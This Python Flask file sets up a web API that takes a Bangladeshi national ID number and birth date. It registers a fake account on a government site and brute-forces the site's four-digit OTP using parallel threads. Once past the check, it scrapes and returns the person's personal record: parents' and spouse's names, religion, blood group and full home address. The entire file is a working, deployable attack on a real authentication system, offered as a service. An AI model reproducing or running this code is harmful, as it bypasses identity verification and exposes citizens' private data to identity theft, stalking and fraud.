from flask import Flask, request, jsonify
import requests
import random
import string
import re
import json
import os
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

app = Flask(__name__)

def extract_selected_option(html_content, field_id):
    """Extract selected option from a dropdown menu using regex"""
    pattern = rf'<select[^>]*id="{field_id}"[^>]*>.*?<option[^>]*selected[^>]*>(.*?)</option>'
    match = re.search(pattern, html_content, re.DOTALL)
    if match:
        return re.sub(r'<[^>]*>', '', match.group(1)).strip()
    return ""

@app.route('/')
def home():
    return jsonify({
        "status": "Flask NID Service is Running!",
        "message": "Welcome to NID Information API",
        "usage": "GET /get-info?nid=YOUR_NID&dob=YOUR_DOB",
        "example": "/get-info?nid=1234567890&dob=01-01-1990",
        "format": "DOB format: DD-MM-YYYY",
        "note": "This may take 30-60 seconds to process"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "service": "nid-api", "version": "1.0"})

@app.route('/get-info', methods=['GET'])
def get_info():
    try:
        nid = request.args.get('nid')
        dob = request.args.get('dob')
        
        if not nid or not dob:
            return jsonify({'error': 'NID and DOB are required', 'format': 'nid=1234567890&dob=01-01-1990'}), 400

        # ==================== OPTIMIZED CONFIG ====================
        mobile_prefix = "017"
        batch_size = 200  # Reduced batch size
        max_batches = 10   # Limit total batches to prevent timeout
        target_location = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"

        # Reduced OTP range for faster processing
        otp_range = [f"{i:04d}" for i in range(min(2000, 10000))]  # Try only first 2000 combinations

        def random_mobile(prefix):
            return prefix + f"{random.randint(0, 99999999):08d}"

        def random_password():
            return "#" + random.choice(string.ascii_uppercase) + f"{random.randint(0, 99)}"

        def get_cookie(data):
            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive'
            })
            
            try:
                res = session.post(url, data=data, allow_redirects=False, timeout=20)
                if res.status_code == 302 and 'mov-verification' in res.headers.get('Location', ''):
                    return session
                else:
                    raise Exception(f"Initial request failed - Status: {res.status_code}")
            except requests.exceptions.Timeout:
                raise Exception("Connection timeout - Target server may be slow")
            except Exception as e:
                raise Exception(f"Network error: {str(e)}")

        def try_otp(session, otp):
            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
            data = {
                "otpDigit1": otp[0],
                "otpDigit2": otp[1],
                "otpDigit3": otp[2],
                "otpDigit4": otp[3]
            }
            try:
                res = session.post(url, data=data, allow_redirects=False, timeout=10)
                if res.status_code == 302 and target_location in res.headers.get('Location', ''):
                    return otp
            except:
                pass
            return None

        def try_batch(session, otp_batch, batch_num):
            print(f"Trying batch {batch_num} with {len(otp_batch)} OTPs...")
            
            # Reduced workers for free tier
            with ThreadPoolExecutor(max_workers=10) as executor:
                future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
                
                for future in as_completed(future_to_otp, timeout=25):  # Batch timeout
                    try:
                        result = future.result()
                        if result:
                            print(f"Found OTP: {result}")
                            executor.shutdown(cancel_futures=True)
                            return result
                    except:
                        continue
            return None

        def fetch_form_data(session):
            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
            try:
                res = session.get(url, timeout=20)
                return res.text
            except:
                raise Exception("Failed to fetch form data")

        def extract_fields(html_content, ids):
            result = {}
            for field_id in ids:
                match = re.search(rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"', html_content)
                result[field_id] = match.group(1) if match else ""
            return result

        def enrich_data(contractor_name, html_content, result):
            # Extract gender using regex
            gender = ""
            if re.search(r'<input[^>]*id="maleGender"[^>]*checked', html_content):
                gender = "Male"
            elif re.search(r'<input[^>]*id="femaleGender"[^>]*checked', html_content):
                gender = "Female"
            elif re.search(r'<input[^>]*id="otherGender"[^>]*checked', html_content):
                gender = "Other"
                
            # Extract additional information
            religion = extract_selected_option(html_content, "religion")
            occupation = extract_selected_option(html_content, "occupation")
            education = extract_selected_option(html_content, "education")
            blood_group = extract_selected_option(html_content, "bloodGroup")
            marital_status = extract_selected_option(html_content, "maritalStatus")

            mapped = {
                "nameBangla": contractor_name,
                "nameEnglish": "",
                "nationalId": nid,
                "dateOfBirth": dob,
                "fatherName": result.get("fatherName", ""),
                "motherName": result.get("motherName", ""),
                "spouseName": result.get("spouseName", ""),
                "gender": gender,
                "religion": religion,
                "occupation": occupation,
                "education": education,
                "bloodGroup": blood_group,
                "maritalStatus": marital_status,
                "birthPlace": result.get("nidPerDistrict", ""),
                "nationality": result.get("nationality", ""),
                "division": result.get("nidPerDivision", ""),
                "district": result.get("nidPerDistrict", ""),
                "upazila": result.get("nidPerUpazila", ""),
                "union": result.get("nidPerUnion", ""),
                "village": result.get("nidPerVillage", ""),
                "ward": result.get("nidPerWard", ""),
                "zip_code": result.get("nidPerZipCode", ""),
                "post_office": result.get("nidPerPostOffice", "")
            }

            # Build address
            address_parts = []
            if result.get('nidPerHolding'):
                address_parts.append(f"বাসা/হোল্ডিং: {result.get('nidPerHolding')}")
            if result.get('nidPerVillage'):
                address_parts.append(f"গ্রাম/রাস্তা: {result.get('nidPerVillage')}")
            if result.get('nidPerMouza'):
                address_parts.append(f"মৌজা/মহল্লা: {result.get('nidPerMouza')}")
            if result.get('nidPerUnion'):
                address_parts.append(f"ইউনিয়ন: {result.get('nidPerUnion')}")
            if result.get('nidPerPostOffice') and result.get('nidPerZipCode'):
                address_parts.append(f"ডাকঘর: {result.get('nidPerPostOffice')} - {result.get('nidPerZipCode')}")
            if result.get('nidPerUpazila'):
                address_parts.append(f"উপজেলা: {result.get('nidPerUpazila')}")
            if result.get('nidPerDistrict'):
                address_parts.append(f"জেলা: {result.get('nidPerDistrict')}")
            if result.get('nidPerDivision'):
                address_parts.append(f"বিভাগ: {result.get('nidPerDivision')}")
            
            address_line = ", ".join(address_parts)
            mapped["permanentAddress"] = address_line
            mapped["presentAddress"] = address_line
            
            return mapped

        # Main workflow with timeout protection
        print(f"Processing NID: {nid}, DOB: {dob}")
        
        password = random_password()
        data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": random_mobile(mobile_prefix),
            "dateOfBirth": dob,
            "password": password,
            "confirm_password": password,
            "next1": ""
        }

        # 1. Get cookie/session
        print("Getting session cookie...")
        session = get_cookie(data)

        # 2. Try OTP batches with limit to prevent timeout
        print("Starting OTP brute force...")
        random.shuffle(otp_range)
        found_otp = None
        
        for i in range(0, min(len(otp_range), max_batches * batch_size), batch_size):
            batch_num = (i // batch_size) + 1
            if batch_num > max_batches:
                break
                
            batch = otp_range[i:i+batch_size]
            try:
                found_otp = try_batch(session, batch, batch_num)
                if found_otp:
                    break
            except Exception as e:
                print(f"Batch {batch_num} failed: {e}")
                continue

        if found_otp:
            print(f"Success! Found OTP: {found_otp}")
            html_content = fetch_form_data(session)
            
            ids = ["contractorName", "fatherName", "motherName", "spouseName", "nidPerDivision",
                   "nidPerDistrict", "nidPerUpazila", "nidPerUnion", "nidPerVillage", "nidPerWard",
                   "nidPerZipCode", "nidPerPostOffice", "nidPerHolding", "nidPerMouza"]
            
            result = extract_fields(html_content, ids)
            mapped_data = enrich_data(result.get("contractorName", ""), html_content, result)
            
            # Add success metadata
            mapped_data["_metadata"] = {
                "success": True,
                "foundOTP": found_otp,
                "processed": f"Tried {min(max_batches * batch_size, len(otp_range))} combinations"
            }
            
            return jsonify(mapped_data), 200
        else:
            return jsonify({
                "error": "OTP not found", 
                "message": f"Tried {min(max_batches * batch_size, len(otp_range))} combinations",
                "suggestion": "Try again later - OTP might be in remaining combinations"
            }), 404
            
    except Exception as e:
        error_msg = str(e)
        print(f"Error occurred: {error_msg}")
        return jsonify({
            'error': error_msg, 
            'type': type(e).__name__,
            'suggestion': 'Check your NID and DOB format, or try again later'
        }), 500

# Optimized for hosting
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
